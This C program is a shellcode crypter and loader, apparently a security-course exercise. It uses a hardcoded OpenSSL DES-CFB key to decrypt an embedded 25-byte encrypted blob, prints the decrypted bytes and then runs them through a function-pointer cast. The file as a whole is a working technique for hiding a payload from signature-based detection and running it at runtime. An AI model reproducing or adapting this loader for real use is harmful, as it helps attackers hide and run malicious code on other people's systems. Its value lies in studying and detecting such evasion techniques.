#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <openssl/des.h>
 
char* _decrypt(char *key, char *msg, int size)
{
    static char* shellcode;
    int num=0;
    DES_cblock keycopy;
    DES_key_schedule schedule;
    shellcode = (char *)malloc(size);
    memcpy(keycopy, key, 8); //des_cblock MUST BE 8 bytes
    DES_set_odd_parity(&keycopy);
    DES_set_key_checked(&keycopy, &schedule);
    DES_cfb64_encrypt((unsigned char *)msg, (unsigned char *)shellcode,
    size, &schedule, &keycopy, &num, DES_DECRYPT );
    return (shellcode);
}
 
int main(void) {
    char key[]="slae_3_2"; //MUST 8 CHAR LONG (see comment above)
    //the resulting crypted bytes generated
    char enc_code[]=\
"\xa7\x74\xfe\x21\x86\x19\x13\xec\x41\xc4\x13\xf9\xae\x99\x20\xf6\xfa\x43\x8d\xaa\xea\xd2\xa8\x70\xd1";     
    char *shell_code;
    int scSize = sizeof(enc_code)-1;
    shell_code = malloc(scSize);
    printf("Shellcode size:%d \n",scSize);
    memcpy(shell_code,_decrypt(key,enc_code,scSize), scSize);
    int c=0;
    printf("Decrypted text:\n");
    for (c=0; c < scSize; c++){
        printf("\\x%02x", (unsigned char)shell_code[c]);

    }
    printf("\n");
    int (*ret)() = (int(*)())shell_code;
    ret();
}
